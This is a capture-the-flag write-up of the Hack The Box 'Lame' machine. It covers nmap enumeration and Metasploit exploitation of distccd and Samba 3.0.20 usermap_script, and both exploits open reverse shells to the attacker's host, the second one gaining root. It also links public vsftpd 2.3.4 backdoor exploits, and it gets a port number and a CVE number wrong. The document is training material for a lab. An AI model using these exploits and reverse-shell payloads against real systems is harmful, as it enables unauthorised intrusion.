# Lame
#TJNull

[Lame](https://app.hackthebox.com/machines/Lame) is a really easy box and even for a beginner it won't take more than an hour at max. The main purpose of this room is to make you realize that all the services that are exposed should be tested thoroughly for any kind of vulnerability.

So, let's begin!

## Enumeration
Lame has been assigned the IP address: 10.10.10.3. So, the first thing that we can do is start an `nmap` scan against it to determine all the open ports.
```
┌──(kali㉿kali)-[~/Desktop/htb/lame]
└─$ sudo nmap -p- -T4 -sS 10.10.10.3 | tee open_ports
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 22:44 EDT
Nmap scan report for 10.10.10.3
Host is up (0.090s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 138.66 seconds
```

It can be seen that multiple ports are open. So, we can run another `nmap` scan to determine the version of all the services that are running on this box.
```
┌──(kali㉿kali)-[~/Desktop/htb/lame]
└─$ sudo nmap -p3632,21,22,139,445 -sV -sC -O 10.10.10.3 | tee port_details
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 22:56 EDT
Nmap scan report for 10.10.10.3
Host is up (0.18s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), Arris TG862G/CT cable modem (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Linux 2.6.22 (92%), Linux 2.6.8 - 2.6.30 (92%), Dell iDRAC 6 remote access controller (Linux 2.6) (92%), Supermicro IPMI BMC (Linux 2.6.24) (92%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-08-16T22:57:20-04:00
|_clock-skew: mean: 2h00m05s, deviation: 2h49m45s, median: 2s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.76 seconds
                                                               
```

## Gaining Foothold
Here, the most interesting service appears to be the `distccd` which is running on port 3632. Right from a quick google search we can find that the `distccd v1` can be exploited using [metasploit](https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec/).

```
┌──(kali㉿kali)-[~/Desktop/htb/lame]
└─$ msfconsole 
msf6 > search distcc

Matching Modules
================

   #  Name                           Disclosure Date  Rank       Check  Description
   -  ----                           ---------------  ----       -----  -----------
   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/misc/distcc_exec

msf6 > use 0
msf6 exploit(unix/misc/distcc_exec) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(unix/misc/distcc_exec) > set LHOST 10.10.16.4
LHOST => 10.10.16.4
msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse_ruby
payload => cmd/unix/reverse_ruby
msf6 exploit(unix/misc/distcc_exec) > run

[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Command shell session 1 opened (10.10.16.4:4444 -> 10.10.10.3:53836 ) at 2022-08-16 23:02:26 -0400

ls
5563.jsvc_up
vgauthsvclog.txt.0
vmware-root
whoami
daemon
bash
```

And a it can be seen, we easily get access to the machine as the `daemon` account. We can now explore the user directories in `/home` to find the user flag. In this case there were 4 users directories as shown below and user flag was in the `/home/makis` directory.
```
ls -la /home
total 24
drwxr-xr-x  6 root    root    4096 Mar 14  2017 .
drwxr-xr-x 21 root    root    4096 Oct 31  2020 ..
drwxr-xr-x  2 root    nogroup 4096 Mar 17  2010 ftp
drwxr-xr-x  4 makis   makis   4096 Aug 17 06:25 makis
drwxr-xr-x  2 service service 4096 Apr 16  2010 service
drwxr-xr-x  3    1001    1001 4096 May  7  2010 user
```

## Privilege Escalation
The next task is to perform privilege escalation. So, we can get started by exploring all the user files and see if we can file some interesting executables or something else.
```
ls -la /home
total 24
drwxr-xr-x  6 root    root    4096 Mar 14  2017 .
drwxr-xr-x 21 root    root    4096 Oct 31  2020 ..
drwxr-xr-x  2 root    nogroup 4096 Mar 17  2010 ftp
drwxr-xr-x  4 makis   makis   4096 Aug 17 06:25 makis
drwxr-xr-x  2 service service 4096 Apr 16  2010 service
drwxr-xr-x  3    1001    1001 4096 May  7  2010 user
ls -la /home/ftp
total 8
drwxr-xr-x 2 root nogroup 4096 Mar 17  2010 .
drwxr-xr-x 6 root root    4096 Mar 14  2017 ..
ls -la /home/makis
total 36
drwxr-xr-x 4 makis makis 4096 Aug 17 06:25 .
drwxr-xr-x 6 root  root  4096 Mar 14  2017 ..
-rw------- 1 makis makis 1107 Mar 14  2017 .bash_history
-rw-r--r-- 1 makis makis  220 Mar 14  2017 .bash_logout
-rw-r--r-- 1 makis makis 2928 Mar 14  2017 .bashrc
drwx------ 2 makis makis 4096 Aug 17 06:25 .gconf
drwx------ 2 makis makis 4096 Aug 17 06:25 .gconfd
-rw-r--r-- 1 makis makis  586 Mar 14  2017 .profile
-rw-r--r-- 1 makis makis    0 Mar 14  2017 .sudo_as_admin_successful
-rw-r--r-- 1 makis makis   33 Aug 16 22:40 user.txt
ls -la /home/service
total 20
drwxr-xr-x 2 service service 4096 Apr 16  2010 .
drwxr-xr-x 6 root    root    4096 Mar 14  2017 ..
-rw-r--r-- 1 service service  220 Apr 16  2010 .bash_logout
-rw-r--r-- 1 service service 2928 Apr 16  2010 .bashrc
-rw-r--r-- 1 service service  586 Apr 16  2010 .profile
ls -la /home/user
total 28
drwxr-xr-x 3 1001 1001 4096 May  7  2010 .
drwxr-xr-x 6 root root 4096 Mar 14  2017 ..
-rw------- 1 1001 1001  165 May  7  2010 .bash_history
-rw-r--r-- 1 1001 1001  220 Mar 31  2010 .bash_logout
-rw-r--r-- 1 1001 1001 2928 Mar 31  2010 .bashrc
-rw-r--r-- 1 1001 1001  586 Mar 31  2010 .profile
drwx------ 2 1001 1001 4096 May  7  2010 .ssh
```

The next thing that we can look for would be to see if we can run any command as `sudo` or any other user. For this we can use the command `sudo -l` but the thing is we need to know the password of the `daemon` account to get the output which we don't know. 

We can also take a look at files that have their SUID bit set by running the command `find / -perm /2000 2> /dev/null` but here as well we can't find anything useful.

Maybe at this point we should take a step back because we have access as a service account and not as a user account (and most not many access rights are provided to service accounts). So, we can take a look back at the services that we found from the `nmap` scan. 

We saw that `vsftpd 2.3.4` was open on port 24 and we can find the CVE-2011-2523 exploit for that online. Some of the exploits that we can try are:
1. https://github.com/padsalatushal/CVE-2011-2523
2. https://github.com/nobodyatall648/CVE-2011-2523
3. https://www.exploit-db.com/exploits/49757

But none of these work, probably they patched this vulnerability on this box. So, its better to keep moving on and check another service.

The next service that we can see is the `Samba-3.0.20` running on port 445. Again, from a quick google search we can see that there is a [usermap](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/) vulnerability associated with this version through which you can get direct `root` access. 

```
msf6 > search usermap

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set LhOST 10.10.16.4
LhOST => 10.10.16.4
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Command shell session 1 opened (10.10.16.4:4444 -> 10.10.10.3:46663 ) at 2022-08-16 23:32:17 -0400

whoami
root
cd /root
ls  	
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
```

And there we get the root flag!

## Some Key Points to Take Away
1. Always check for any kind of vulnerability for all the services that are exposed.

References:
1. [Lame](https://app.hackthebox.com/machines/Lame)
2. [distcc_exec Exploit](https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec/)
3. [padsalatushal/CVE-2011-2523](https://github.com/padsalatushal/CVE-2011-2523)
4. [nobodyatall648/CVE-2011-2523](https://github.com/nobodyatall648/CVE-2011-2523)
5. [Metasploit CVE-2011-2623](https://www.exploit-db.com/exploits/49757)
6. [Usermap Exploit](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)
